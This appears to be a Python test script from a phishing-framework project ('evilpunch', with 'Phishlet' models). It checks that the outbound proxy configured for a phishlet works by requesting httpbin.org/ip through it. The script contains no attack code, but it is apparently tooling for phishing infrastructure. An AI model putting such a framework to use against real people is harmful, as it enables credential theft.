#!/usr/bin/env python3
import os
import django
import asyncio
import aiohttp

os.environ.setdefault('DJANGO_SETTINGS_MODULE', 'evilpunch.settings')
django.setup()

from core.models import Phishlet, Proxy

async def test_proxy():
    print("Testing proxy...")
    
    # Get phishlet with proxy
    phishlet = Phishlet.objects.get(name='fluxxset')
    print(f"Phishlet: {phishlet.name}")
    
    if phishlet.proxy:
        print(f"Proxy: {phishlet.proxy.name}")
        print(f"Proxy URL: {phishlet.proxy.get_proxy_url()}")
        
        # Test proxy connection
        proxy_url = f"{phishlet.proxy.proxy_type}://{phishlet.proxy.host}:{phishlet.proxy.port}"
        print(f"aiohttp proxy URL: {proxy_url}")
        
        try:
            async with aiohttp.ClientSession() as session:
                request_kwargs = {
                    'method': 'GET',
                    'url': 'http://httpbin.org/ip',
                    'proxy': proxy_url,
                    'proxy_auth': aiohttp.BasicAuth(
                        phishlet.proxy.username, 
                        phishlet.proxy.password
                    )
                }
                
                print(f"Making request with: {request_kwargs}")
                
                async with session.request(**request_kwargs) as resp:
                    print(f"Status: {resp.status}")
                    if resp.status == 200:
                        content = await resp.text()
                        print(f"Response: {content}")
                        print("SUCCESS: Proxy working!")
                    else:
                        print(f"Failed with status: {resp.status}")
                        
        except Exception as e:
            print(f"Error: {e}")
            import traceback
            traceback.print_exc()
    else:
        print("No proxy configured")

if __name__ == "__main__":
    asyncio.run(test_proxy())
